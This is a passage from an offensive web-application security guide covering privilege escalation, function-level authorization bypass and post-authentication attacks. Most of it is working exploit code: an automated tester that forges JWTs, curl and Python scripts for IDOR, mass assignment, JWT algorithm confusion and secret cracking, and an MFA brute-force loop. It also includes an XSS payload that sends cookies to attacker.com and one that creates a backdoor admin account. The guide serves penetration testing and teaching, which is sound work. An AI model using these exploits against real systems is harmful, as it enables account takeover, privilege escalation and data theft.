            if 'role' in modified_payload:
                modified_payload['role'] = 'admin'
            modified_payload['admin'] = True
            
            header = {'alg': 'none', 'typ': 'JWT'}
            
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).decode().rstrip('=')
            
            none_token = f"{header_encoded}.{payload_encoded}."
            
            # Test with none algorithm token
            test_session = requests.Session()
            test_session.headers['Authorization'] = f'Bearer {none_token}'
            
            response = test_session.get(f"{self.base_url}/admin")
            
            if response.status_code == 200:
                self.log("JWT none algorithm vulnerability found!", 'vuln')
                self.vulnerabilities.append({
                    'type': 'JWT None Algorithm',
                    'description': 'JWT accepts none algorithm',
                    'exploit_token': none_token
                })
                return True
            
            # Test weak secrets
            weak_secrets = ['secret', 'password', 'key', '123456']
            
            import jwt as jwt_lib
            
            for secret in weak_secrets:
                try:
                    forged = jwt_lib.encode(modified_payload, secret, algorithm='HS256')
                    
                    test_session = requests.Session()
                    test_session.headers['Authorization'] = f'Bearer {forged}'
                    
                    response = test_session.get(f"{self.base_url}/admin")
                    
                    if response.status_code == 200:
                        self.log(f"JWT weak secret found: {secret}", 'vuln')
                        self.vulnerabilities.append({
                            'type': 'JWT Weak Secret',
                            'secret': secret,
                            'description': f'JWT signed with weak secret: {secret}'
                        })
                        return True
                except:
                    pass
        
        except Exception as e:
            self.log(f"JWT manipulation error: {e}", 'error')
        
        return False
    
    def test_parameter_pollution(self):
        """Test HTTP parameter pollution"""
        self.log("\n=== Testing Parameter Pollution ===")
        
        test_endpoint = '/api/user/update'
        url = urljoin(self.base_url, test_endpoint)
        
        # Send duplicate parameters
        pollution_tests = [
            'email=user@test.com&role=user&role=admin',
            'email=user@test.com&role=admin&role=user',
            'user_id=5&user_id=1&email=test@test.com',
        ]
        
        for test_data in pollution_tests:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            response = self.session.post(url, data=test_data, headers=headers)
            
            if response.status_code == 200:
                # Verify escalation
                verify = self.session.get(f"{self.base_url}/api/user/me")
                
                if 'admin' in verify.text.lower():
                    self.log(f"Parameter pollution successful: {test_data}", 'vuln')
                    self.vulnerabilities.append({
                        'type': 'HTTP Parameter Pollution',
                        'url': url,
                        'payload': test_data,
                        'description': 'Role escalation via parameter pollution'
                    })
                    return True
        
        return False
    
    def test_graphql_introspection(self):
        """Test GraphQL for admin queries"""
        self.log("\n=== Testing GraphQL ===")
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/graphql/api']
        
        introspection_query = {
            'query': '''
            {
              __schema {
                types {
                  name
                  fields {
                    name
                  }
                }
              }
            }
            '''
        }
        
        for endpoint in graphql_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            try:
                headers = {'Content-Type': 'application/json'}
                response = self.session.post(url,
                                            data=json.dumps(introspection_query),
                                            headers=headers)
                
                if response.status_code == 200:
                    schema = response.json()
                    
                    self.log(f"GraphQL introspection enabled at: {url}")
                    
                    # Look for admin operations
                    admin_operations = []
                    
                    try:
                        for type_def in schema['data']['__schema']['types']:
                            if type_def['fields']:
                                for field in type_def['fields']:
                                    field_name = field['name'].lower()
                                    if any(kw in field_name for kw in ['admin', 'delete', 'promote', 'role']):
                                        admin_operations.append(field['name'])
                    except:
                        pass
                    
                    if admin_operations:
                        self.log(f"Admin operations found: {admin_operations}", 'vuln')
                        self.vulnerabilities.append({
                            'type': 'GraphQL Admin Operations',
                            'url': url,
                            'operations': admin_operations,
                            'description': 'Admin GraphQL operations accessible'
                        })
            
            except Exception as e:
                self.log(f"GraphQL test error: {e}", 'error')
    
    def generate_report(self):
        """Generate vulnerability report"""
        self.log("\n" + "="*60)
        self.log("PRIVILEGE ESCALATION TEST REPORT", 'success')
        self.log("="*60)
        
        if not self.vulnerabilities:
            self.log("No privilege escalation vulnerabilities found", 'success')
            return
        
        self.log(f"\nFound {len(self.vulnerabilities)} vulnerabilities:", 'vuln')
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            self.log(f"\n[{i}] {vuln['type']}")
            for key, value in vuln.items():
                if key != 'type':
                    self.log(f"    {key}: {value}")
        
        # Save to file
        report_file = 'privilege_escalation_report.json'
        with open(report_file, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
        
        self.log(f"\nReport saved to: {report_file}", 'success')
    
    def run_all_tests(self):
        """Run all privilege escalation tests"""
        if not self.login():
            return False
        
        self.test_idor()
        self.test_mass_assignment()
        self.test_hidden_endpoints()
        self.test_http_methods()
        self.test_cookie_manipulation()
        self.test_jwt_manipulation()
        self.test_parameter_pollution()
        self.test_graphql_introspection()
        
        self.generate_report()
        
        return True

def main():
    parser = argparse.ArgumentParser(
        description='Automated Privilege Escalation Testing Framework'
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    tester = PrivilegeEscalationTester(
        args.url,
        args.username,
        args.password,
        verbose=args.verbose
    )
    
    tester.run_all_tests()

if __name__ == '__main__':
    main()
```

### Usage Examples

**Basic usage**:

```bash
python3 priv_esc_tester.py http://target.com -u user1 -p password123 -v
```

**Manual exploitation examples**:

```python
# Example 1: IDOR exploitation
import requests

session = requests.Session()
session.post('http://target.com/login', data={'username': 'user5', 'password': 'pass'})

# Access admin profile (user ID 1)
response = session.get('http://target.com/api/user/1')
admin_data = response.json()
print(f"Admin email: {admin_data['email']}")

# Modify admin account
session.put('http://target.com/api/user/1', json={'email': 'attacker@evil.com'})
```

```python
# Example 2: Mass assignment exploitation
import requests
import json

session = requests.Session()
session.post('http://target.com/login', data={'username': 'user1', 'password': 'pass'})

# Inject admin role
payload = {
    'email': 'user@test.com',
    'role': 'admin',
    'isAdmin': True
}

headers = {'Content-Type': 'application/json'}
session.post('http://target.com/api/user/update', 
            data=json.dumps(payload), 
            headers=headers)

# Verify escalation
response = session.get('http://target.com/admin/dashboard')
print(f"Admin access: {response.status_code == 200}")
```

```python
# Example 3: JWT manipulation
import jwt
import json

# Captured token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1LCJyb2xlIjoidXNlciJ9.sig"

# Decode and modify
payload = jwt.decode(token, options={"verify_signature": False})
payload['role'] = 'admin'

# Forge with weak secret
forged = jwt.encode(payload, 'secret', algorithm='HS256')

# Use forged token
import requests
headers = {'Authorization': f'Bearer {forged}'}
response = requests.get('http://target.com/api/admin/users', headers=headers)
print(response.json())
```

### Defense Detection Checklist

When testing, look for these security controls:

```python
class SecurityControlChecker:
    """Check for common security controls"""
    
    @staticmethod
    def check_authorization():
        """Indicators of proper authorization"""
        indicators = [
            'Checking if request has proper role',
            'Verifying user owns resource',
            'Validating JWT signature',
            'Checking CSRF token',
        ]
        return indicators
    
    @staticmethod
    def check_missing_controls():
        """Common missing security controls"""
        missing = [
            'No role verification on update endpoints',
            'Direct object references without ownership check',
            'JWT signature not verified',
            'No rate limiting on privileged operations',
            'HTTP methods not restricted',
            'GraphQL introspection enabled in production',
        ]
        return missing
```

---

**Related topics**: Authentication bypass, session management flaws, access control vulnerabilities, business logic exploitation, API security testing, authorization frameworks

**Key takeaways**:

- Horizontal escalation: Accessing same-level user resources (IDOR primary vector)
- Vertical escalation: Gaining higher privileges (role manipulation, hidden endpoints)
- Always test parameter injection in update operations (mass assignment)
- JWT vulnerabilities are common (none algorithm, weak secrets)
- GraphQL introspection can reveal admin-only operations
- Cookie manipulation often overlooked by developers

[Inference]: Effectiveness of these techniques depends on application architecture and security controls implemented; always test systematically through all available vectors.

---

## Permission Inheritance Flaws

Permission inheritance issues occur when access controls are improperly propagated through object hierarchies, user groups, or resource relationships, allowing unauthorized access through legitimate inheritance chains.

### Understanding Permission Models

**Role-Based Access Control (RBAC) inheritance:**

```
Administrator
    ├── Moderator
    │   └── Editor
    │       └── User
    └── Manager
        └── Employee
```

**[Inference]** Flaws typically arise when:

- Child roles inherit excessive parent permissions
- Permission revocation doesn't cascade properly
- Intermediate roles grant unintended access paths
- Role changes don't trigger permission recalculation

### Testing for Inheritance Flaws

**Basic enumeration workflow:**

```bash
# 1. Map role hierarchy
# Login as low-privilege user, capture all requests

# 2. Identify permission-checking endpoints
# Common patterns:
GET /api/user/permissions
GET /api/roles/current
POST /graphql # Query: { currentUser { roles permissions } }

# 3. Document accessible resources
# Create spreadsheet mapping:
# Role | Endpoint | Method | Response Code | Accessible Data

# 4. Test inheritance paths
# Register accounts at each privilege level
# Map what each level can access
```

**Example test case - File sharing application:**

```bash
# Scenario: Shared folder inherits parent permissions incorrectly

# Step 1: User A creates folder /documents (private)
curl -X POST "https://target/api/folders" \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -d '{"name":"documents","visibility":"private"}'

# Step 2: User A creates subfolder /documents/sensitive
curl -X POST "https://target/api/folders" \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -d '{"name":"sensitive","parent_id":123,"visibility":"private"}'

# Step 3: User A shares /documents with User B (read-only)
curl -X POST "https://target/api/share" \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -d '{"folder_id":123,"user":"userB","permission":"read"}'

# Step 4: Test if User B can access /documents/sensitive (should fail)
curl -X GET "https://target/api/folders/124/files" \
  -H "Authorization: Bearer USER_B_TOKEN"

# VULNERABILITY: If this succeeds, child folders inherit parent sharing
# without respecting their own visibility settings
```

### Group/Organization Inheritance Exploits

**Multi-tenant application testing:**

```bash
# Common flaw: Resources inherit organization permissions incorrectly

# Test 1: Cross-organization resource access
# Create resource in Org A
curl -X POST "https://target/api/documents" \
  -H "Authorization: Bearer ORG_A_USER_TOKEN" \
  -d '{"title":"Secret Doc","content":"Confidential"}'
# Response: {"id": 5001, "org_id": 100}

# Attempt access from Org B using direct ID
curl -X GET "https://target/api/documents/5001" \
  -H "Authorization: Bearer ORG_B_USER_TOKEN"

# VULNERABILITY: If this returns data, organization isolation is broken

# Test 2: Inherited group permissions
# Add user to Group A (has admin rights on Project X)
# Remove user from Group A
# Check if permissions on Project X persist (should be revoked)

curl -X GET "https://target/api/projects/X/settings" \
  -H "Authorization: Bearer REMOVED_USER_TOKEN"

# VULNERABILITY: Stale permissions indicate failed cascade revocation
```

### API-Specific Inheritance Issues

**GraphQL deeply nested queries:**

```graphql
# Test: Accessing restricted data through relationship traversal

# Query as low-privilege user
query {
  publicProject(id: "123") {
    id
    name
    owner {
      email          # Should this be exposed?
      privateProjects {
        id
        name
        secretKey    # Definitely shouldn't be exposed
      }
    }
  }
}
```

**Testing methodology:**

```bash
# 1. Map GraphQL schema
curl -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# 2. Identify relationship chains
# Look for: User -> Organization -> AdminPanel
#           Post -> Author -> PrivateData

# 3. Test depth limits and authorization at each level
# Craft query traversing relationships to reach restricted data

# Common vulnerable pattern:
query {
  myProfile {           # Authorized: own profile
    friends {           # Authorized: friend list
      friends {         # May lack authorization check
        email
        phone
        ssn           # Exposed through nested relationship
      }
    }
  }
}
```

### JWT/Token Inheritance Flaws

**Parent token creating child tokens without proper scope limitation:**

```bash
# Scenario: Admin creates API token for automated task
# Token inherits full admin permissions instead of limited scope

# Admin creates token via UI/API
curl -X POST "https://target/api/tokens/create" \
  -H "Authorization: Bearer ADMIN_JWT" \
  -d '{"name":"backup-script","purpose":"database-backup"}'

# Response: {"token": "at_abc123..."}

# Test token capabilities (should be limited to backup operations)
curl -X GET "https://target/api/users" \
  -H "Authorization: Bearer at_abc123..."

# VULNERABILITY: If this returns user list, token inherited admin permissions

# Test: Token revocation cascade
# Revoke admin's JWT
# Check if child tokens still work

curl -X POST "https://target/api/auth/logout" \
  -H "Authorization: Bearer ADMIN_JWT"

curl -X GET "https://target/api/users" \
  -H "Authorization: Bearer at_abc123..."

# VULNERABILITY: Child tokens should be invalidated with parent
```

### OAuth/SSO Inheritance Exploits

**Scope creep through connected applications:**

```bash
# Scenario: App A has read permissions, App B has write permissions
# Same user account, different OAuth scopes

# App A (read-only) obtains token
# Token payload:
# {
#   "user_id": "12345",
#   "client_id": "app_a",
#   "scope": "read:profile read:posts"
# }

# Attempt to modify scope in token (if not cryptographically signed)
# Or: Use refresh token to request broader scope

curl -X POST "https://target/oauth/token" \
  -d "grant_type=refresh_token&refresh_token=REFRESH&scope=read:profile write:posts"

# VULNERABILITY: If service grants broader scope than originally authorized
```

### Practical Exploitation Tools

**Burp Suite extensions for testing:**

```bash
# Autorize extension - automated authorization testing
# 1. Configure low-privilege user session
# 2. Browse application as high-privilege user
# 3. Extension replays requests with low-privilege session
# 4. Compares responses to identify authorization failures

# Installation (Burp > Extender > BApp Store > Autorize)

# InQL - GraphQL scanner
# Automatically tests query depth and permission boundaries
# Extender > BApp Store > InQL
```

**Custom Python script for inheritance testing:**

```python
#!/usr/bin/env python3
import requests
import itertools

# Test permission inheritance in role hierarchy
roles = {
    'admin': 'admin_token_here',
    'manager': 'manager_token_here',
    'user': 'user_token_here',
    'guest': 'guest_token_here'
}

endpoints = [
    '/api/admin/users',
    '/api/admin/settings',
    '/api/manager/reports',
    '/api/user/profile',
    '/api/public/info'
]

def test_access(endpoint, token, role):
    headers = {'Authorization': f'Bearer {token}'}
    r = requests.get(f'https://target{endpoint}', headers=headers)
    return {
        'role': role,
        'endpoint': endpoint,
        'status': r.status_code,
        'accessible': r.status_code == 200
    }

# Test all combinations
results = []
for endpoint in endpoints:
    for role, token in roles.items():
        result = test_access(endpoint, token, role)
        results.append(result)
        print(f"[{result['status']}] {role} -> {endpoint}")

# Identify anomalies
# Expected: admin accesses all, guest accesses only /public
# Flag: user/guest accessing /admin/* endpoints
```

## Function-Level Authorization Bypass

Function-level authorization failures occur when applications check authentication but fail to verify whether the authenticated user has permission to execute specific functions or actions.

### Common Vulnerable Patterns

**Missing authorization checks on privileged functions:**

```javascript
// VULNERABLE CODE EXAMPLE (Node.js/Express)
app.post('/api/admin/deleteUser', authenticateToken, (req, res) => {
  // Checks if user is authenticated ✓
  // Does NOT check if user is admin ✗
  
  const userId = req.body.userId;
  db.deleteUser(userId);
  res.json({success: true});
});

// SECURE VERSION
app.post('/api/admin/deleteUser', authenticateToken, requireAdmin, (req, res) => {
  // Both authentication and authorization checks ✓
  const userId = req.body.userId;
  db.deleteUser(userId);
  res.json({success: true});
});
```

### Identification Techniques

**Method 1: HTTP method manipulation**

```bash
# Scenario: Admin panel only checks authorization on GET requests

# Normal user attempts to view admin panel
curl -X GET "https://target/admin/users" \
  -H "Authorization: Bearer USER_TOKEN"
# Response: 403 Forbidden (authorization check works)

# Try POST method (may lack authorization check)
curl -X POST "https://target/admin/users" \
  -H "Authorization: Bearer USER_TOKEN"
# Response: 405 Method Not Allowed (but processes request first?)

# Try PUT (common oversight)
curl -X PUT "https://target/admin/users" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"user_id":123,"role":"admin"}'
# VULNERABILITY: If this succeeds, authorization only on GET

# Try other methods
for method in GET POST PUT DELETE PATCH; do
  echo "Testing: $method"
  curl -X $method "https://target/admin/users" \
    -H "Authorization: Bearer USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"test":"data"}'
  echo -e "\n"
done
```

**Method 2: Direct object reference with function access**

```bash
# Scenario: Admin function accessible via direct URL/ID

# Discovery: Admin uses URL like /admin/function/deleteUser/123
# Test: Can normal user access this directly?

curl -X POST "https://target/admin/function/deleteUser/456" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN"

# Alternative pattern: API endpoint naming
# Admin endpoint: /api/v1/admin/users/delete
# User endpoint: /api/v1/users/profile

# Test if removing 'admin' from path still works
curl -X POST "https://target/api/v1/users/delete" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -d '{"user_id":456}'

# Test parameter manipulation
curl -X POST "https://target/api/v1/users/update" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -d '{"user_id":789,"is_admin":true}'
```

**Method 3: Hidden administrative functions**

```bash
# Discovery techniques:

# 1. JavaScript source code analysis
# Download all JS files
wget -r -l 1 -A.js https://target/

# Search for API endpoints
grep -r "api/" *.js | grep -E "(admin|delete|modify|create)"
grep -r "fetch\(|axios\.|\.get\(|\.post\(" *.js

# Look for: /api/admin/*, privileged function names

# 2. Backup/development files
curl "https://target/api.js.bak"
curl "https://target/admin.js.old"
curl "https://target/.git/config"

# 3. API documentation (if exposed)
curl "https://target/api/docs"
curl "https://target/swagger.json"
curl "https://target/api-docs"
curl "https://target/graphql" # GraphQL introspection

# 4. Directory bruteforcing
gobuster dir -u https://target/api/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 \
  -b 404,403 \
  -x json,txt

# Common admin function names to test:
# createAdmin, deleteUser, modifyPermissions, backup, 
# exportData, impersonate, resetPassword, changeRole
```

### REST API Function Bypass

**Predictable endpoint structure exploitation:**

```bash
# Pattern observed:
# GET    /api/users/123      - View user (authorized)
# PUT    /api/users/123      - Update own profile (authorized)
# DELETE /api/users/123      - Not exposed in UI

# Test DELETE (may exist but lack proper authorization)
curl -X DELETE "https://target/api/users/123" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN"

# VULNERABILITY: Returns 200 OK, user deleted

# Test administrative variants
curl -X POST "https://target/api/users/123/promote" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN"

curl -X POST "https://target/api/users/123/setRole" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -d '{"role":"administrator"}'

# Common RESTful patterns to test:
# POST   /resource        - Create
# GET    /resource/:id    - Read
# PUT    /resource/:id    - Update
# DELETE /resource/:id    - Delete
# PATCH  /resource/:id    - Partial update
# POST   /resource/:id/action  - Special actions
```

**Mass assignment vulnerabilities:**

```bash
# Scenario: Update profile endpoint accepts all JSON fields

# Normal update
curl -X PUT "https://target/api/users/profile" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"email":"new@email.com","bio":"My bio"}'

# Test additional fields (backend may process without validation)
curl -X PUT "https://target/api/users/profile" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{
    "email":"new@email.com",
    "is_admin":true,
    "role":"administrator",
    "credits":999999,
    "subscription":"premium",
    "verified":true
  }'

# VULNERABILITY: If backend blindly updates all fields from request

# Discovery: Inspect legitimate admin update request
# Look for hidden fields: is_admin, role, permissions, etc.
```

### GraphQL Function-Level Bypass

**Mutation without proper authorization:**

```bash
# Query accessible functions
curl -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { mutationType { fields { name description } } } }"
  }'

# Response shows available mutations:
# - updateProfile
# - deleteAccount
# - promoteUser (admin only?)
# - deleteUser (admin only?)

# Test admin mutations as normal user
curl -X POST "https://target/graphql" \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { promoteUser(userId: 789, role: \"admin\") { success } }"
  }'

# VULNERABILITY: If mutation succeeds without checking authorization
```

**Batching attacks to bypass rate limiting:**

```graphql
# Single request with multiple mutations
mutation {
  m1: updateUser(id: 1, role: "admin") { success }
  m2: updateUser(id: 2, role: "admin") { success }
  m3: updateUser(id: 3, role: "admin") { success }
  # ... up to 100+ mutations in single request
}
```

### Parameter Manipulation for Function Access

**Role/permission parameters:**

```bash
# Add permission parameters to requests

# Original request (normal user)
curl -X GET "https://target/api/reports" \
  -H "Authorization: Bearer USER_TOKEN"
# Response: 403 Forbidden

# Add role parameter
curl -X GET "https://target/api/reports?role=admin" \
  -H "Authorization: Bearer USER_TOKEN"

# Add permission parameter
curl -X GET "https://target/api/reports" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "X-Role: admin"

# Test in different locations:
# - URL parameters: ?admin=true&role=admin
# - Headers: X-Admin: true, X-Role: admin
# - Cookies: role=admin; permission=full
# - Body (JSON): {"role":"admin","action":"view"}
# - Body (XML): <role>admin</role>
```

**Function name manipulation:**

```bash
# Observed: /api/function/getUserData
# Test variations:
/api/function/getAdminData
/api/function/getAllUserData
/api/function/deleteUserData

# Observed: /api/user/view
# Test:
/api/user/delete
/api/user/modify
/api/user/create
/api/admin/view  # Path traversal in function space
```

### Tools and Automation

**Burp Intruder payloads for function testing:**

```
# Position markers in request:
POST /api/users/§function§ HTTP/1.1
Authorization: Bearer USER_TOKEN

# Payload list (function names):
delete
remove
update
modify
create
promote
demote
reset
export
backup
admin
elevate
grant
revoke
```

**Fuzzing script for function discovery:**

```python
#!/usr/bin/env python3
import requests
import sys

base_url = "https://target/api"
token = "user_token_here"
headers = {"Authorization": f"Bearer {token}"}

# Common admin function names
functions = [
    "deleteUser", "createAdmin", "modifyRole", "promoteUser",
    "resetPassword", "changePermission", "backup", "export",
    "importData", "purge", "elevate", "grant", "revoke",
    "impersonate", "assumeRole", "setAdmin", "addPrivilege"
]

# Test each function
for func in functions:
    endpoints = [
        f"{base_url}/admin/{func}",
        f"{base_url}/{func}",
        f"{base_url}/users/{func}",
        f"{base_url}/function/{func}"
    ]
    
    for endpoint in endpoints:
        for method in ['GET', 'POST', 'PUT', 'DELETE']:
            try:
                r = requests.request(
                    method, endpoint, 
                    headers=headers,
                    json={"user_id": 999},
                    timeout=5
                )
                
                if r.status_code not in [404, 403]:
                    print(f"[!] FOUND: {method} {endpoint} -> {r.status_code}")
                    
            except Exception as e:
                pass
```

## Post-Authentication Exploits

Post-authentication vulnerabilities are exploitable only after successful authentication, targeting session management, account functions, and authenticated-user features.

### Session Fixation & Hijacking

**Session fixation attack:**

```bash
# Scenario: Application doesn't regenerate session ID after login

# 1. Attacker obtains valid session ID (before authentication)
curl -c cookies.txt "https://target/login"
# Cookies saved: PHPSESSID=abc123xyz

# 2. Attacker sends victim link with fixed session
# https://target/login?PHPSESSID=abc123xyz
# Or sets cookie: document.cookie="PHPSESSID=abc123xyz"

# 3. Victim logs in using this session
# (Simulating victim's action)

# 4. Attacker uses same session ID (now authenticated)
curl -b "PHPSESSID=abc123xyz" "https://target/dashboard"
# VULNERABILITY: Attacker gains access to victim's session

# Testing for vulnerability:
# Step 1: Note session ID before login
# Step 2: Login
# Step 3: Check if session ID changed
# If unchanged: VULNERABLE to session fixation
```

**Session hijacking via XSS:**

```javascript
// Exploit: Steal session token via XSS
<script>
fetch('https://attacker.com/collect?cookie=' + document.cookie);
</script>

// Modern alternative (httpOnly cookies can't be accessed):
// Exfiltrate via actions using victim's session
<script>
fetch('/api/admin/createUser', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'backdoor',
    password: 'P@ssw0rd',
    role: 'admin'
  })
});
</script>
```

**Testing session security:**

```bash
# Check session attributes
# 1. Secure flag (HTTPS only)
curl -v "https://target/login" 2>&1 | grep -i "set-cookie"
# Look for: Set-Cookie: session=...; Secure; HttpOnly

# 2. HttpOnly flag (no JavaScript access)
# Should see: HttpOnly in Set-Cookie header

# 3. SameSite attribute (CSRF protection)
# Look for: SameSite=Strict or SameSite=Lax

# Test session timeout
# Login, wait 30 minutes, try accessing protected resource
curl -b "session=TOKEN" "https://target/dashboard"
# Should receive: 401 Unauthorized or redirect to login

# Test concurrent sessions
# Login from Browser 1, note session
# Login from Browser 2 with same account
# Check if Browser 1 session still valid
# VULNERABILITY: If both sessions work, no concurrent session limit
```

### JWT Post-Authentication Exploits

**Algorithm confusion attack:**

```python
#!/usr/bin/env python3
import jwt
import base64

# Scenario: Server accepts both RS256 (asymmetric) and HS256 (symmetric)

# 1. Obtain public key (from /jwks, /.well-known/jwks.json, or certificate)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# 2. Original JWT (signed with RS256 using private key)
original_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.signature"

# 3. Decode payload
header, payload, signature = original_jwt.split('.')
decoded_payload = jwt.decode(original_jwt, options={"verify_signature": False})
print(f"Original: {decoded_payload}")

# 4. Modify payload (elevate privileges)
decoded_payload['role'] = 'admin'

# 5. Create new JWT signed with HS256 using public key as secret
malicious_jwt = jwt.encode(
    decoded_payload,
    public_key,
    algorithm='HS256',
    headers={'typ': 'JWT', 'alg': 'HS256'}
)

print(f"Malicious JWT: {malicious_jwt}")

# VULNERABILITY: If server uses public key to verify HS256 signature
# (because HS256 uses symmetric key, public key becomes the secret)
```

**None algorithm exploit:**

```python
#!/usr/bin/env python3
import json
import base64

# Original JWT
original = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.sig"

# Decode parts
header, payload, sig = original.split('.')

# Modify header (change algorithm to "none")
header_data = json.loads(base64.urlsafe_b64decode(header + '=='))
header_data['alg'] = 'none'
new_header = base64.urlsafe_b64encode(
    json.dumps(header_data).encode()
).decode().rstrip('=')

# Modify payload (elevate to admin)
payload_data = json.loads(base64.urlsafe_b64decode(payload + '=='))
payload_data['role'] = 'admin'
new_payload = base64.urlsafe_b64encode(
    json.dumps(payload_data).encode()
).decode().rstrip('=')

# Create unsigned JWT (empty signature)
malicious_jwt = f"{new_header}.{new_payload}."

print(f"Malicious JWT: {malicious_jwt}")

# Test with curl
# curl -H "Authorization: Bearer {malicious_jwt}" https://target/api/admin
```

**JWT secret brute-forcing:**

```bash
# Using jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
# 1. Format JWT for hashcat
# Replace . with # in JWT, remove signature
echo "<JWT_TOKEN>" > jwt.txt

# 2. Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Once cracked, forge new token:
python3 jwt_tool.py <JWT_TOKEN> -T -S hs256 -p "cracked_secret" -pc "role" -pv "admin"
```

### Account Takeover Techniques

**Password reset token exploitation:**

```bash
# Test 1: Token predictability
# Request password reset multiple times, analyze tokens
for i in {1..10}; do
  curl -X POST "https://target/api/reset-password" \
    -d "email=test$i@test.com" &
done
# Analyze tokens for patterns (sequential, timestamp-based, etc.)

# Test 2: Token reuse
# Request reset token
# Use token to reset password
# Try using same token again
curl -X POST "https://target/api/reset-password/confirm" \
  -d "token=abc123&new_password=hacked123"
# VULNERABILITY: If token works multiple times

# Test 3: Token expiration
# Request token, wait 24+ hours, attempt use
# Should fail if proper expiration implemented

# Test 4: Token for different account
# Request token for victim@target.com
# Intercept token: abc123
# Try using it for attacker@evil.com
curl -X POST "https://target/api/reset-password/confirm" \
  -d "token=abc123&email=attacker@evil.com&new_password=hacked"
# VULNERABILITY: If email not bound to token
```

**Email verification bypass:**

```bash
# Scenario: Application requires email verification

# Test 1: Race condition in verification
# Register account
# Simultaneously: 
# - Tab 1: Click verification link
# - Tab 2: Attempt to use account features
# VULNERABILITY: Features accessible before verification completes

# Test 2: Parameter manipulation
# Verification URL: /verify?token=abc123&email=user@test.com
# Change email parameter:
/verify?token=abc123&email=victim@target.com
# VULNERABILITY: If token not bound to specific email

# Test 3: Response manipulation
# Capture verification request
curl -X POST "https://target/api/verify" \
  -d "token=invalid_token"
# Response: {"verified": false}

# Intercept and change response to:
# {"verified": true}
# VULNERABILITY: If client-side verification check
```

### Multi-Factor Authentication (MFA) Bypass

**Common bypass techniques:**

```bash
# Test 1: Direct endpoint access (skip MFA)
# Login flow: /login -> /mfa -> /dashboard
# Try accessing /dashboard directly after /login
curl -X GET "https://target/dashboard" \
  -H "Cookie: session_after_first_factor"
# VULNERABILITY: Lack of MFA enforcement check

# Test 2: MFA code reuse
# Login, enter MFA code
# Logout, login again
# Try same MFA code
# Should fail; if succeeds: reuse vulnerability

# Test 3: MFA brute force (no rate limiting)
for code in {000000..999999}; do
  response=$(curl -s -X POST "https://target/api/mfa/verify" \
    -d "code=$code" \
    -H "Cookie: session_token")
  
  if echo "$response" | grep -q "success"; then
    echo "Valid code: $code"
    break
  fi
done
# VULNERABILITY: No rate limiting allows brute force

# Test 4: Response manipulation
# Submit wrong MFA code
# Intercept response: {"valid": false, "redirect": "/mfa"}
# Change to: {"valid": true, "redirect": "/dashboard"}
# VULNERABILITY: Client-side MFA validation
```

**Backup code exploitation:**

```bash
# Scenario: Application provides backup codes for MFA

# Test 1: Backup code discovery
# Check common locations:
curl "https://target/api/user/backup-codes"
curl "https://target/api/mfa/backup"
# VULNERABILITY: Accessible without MFA verification

# Test 2: Backup code predictability
# Generate multiple sets, analyze for patterns
# Sequential: 12345678, 12345679, 12345680
# Timestamp-based: [unix_timestamp][random_2_digits]

# Test 3: Unlimited backup code generation
# Keep requesting new backup codes
# VULNERABILITY: Old codes not invalidated, accumulating valid codes
```

### OAuth Post-Authentication Exploits

**Token leakage via Referer header:**

```bash
# Scenario: OAuth callback includes token in URL
# Callback: https://target/callback?code=SECRET_CODE

# If page contains external resources:
<img src="https://analytics.external.com/pixel.gif">

# Referer header leaked:
# Referer: https://target/callback?code=SECRET_CODE

# Testing:
# 1. Complete OAuth flow
# 2. Monitor callback page for external resources
# 3. Check if code/token visible in URL
# VULNERABILITY: Sensitive token in URL, leaked via Referer
```

**State parameter bypass (CSRF on OAuth):**

```bash
# Proper OAuth flow includes 'state' parameter (CSRF token)

# Attacker's malicious OAuth link:
https://oauth-provider.com/authorize?
  client_id=TARGET_APP&
  redirect_uri=https://target/callback&
  state=ATTACKER_CONTROLLED

# Victim clicks link, authorizes
# Callback sent to: https://target/callback?code=VICTIM_CODE&state=ATTACKER_CONTROLLED

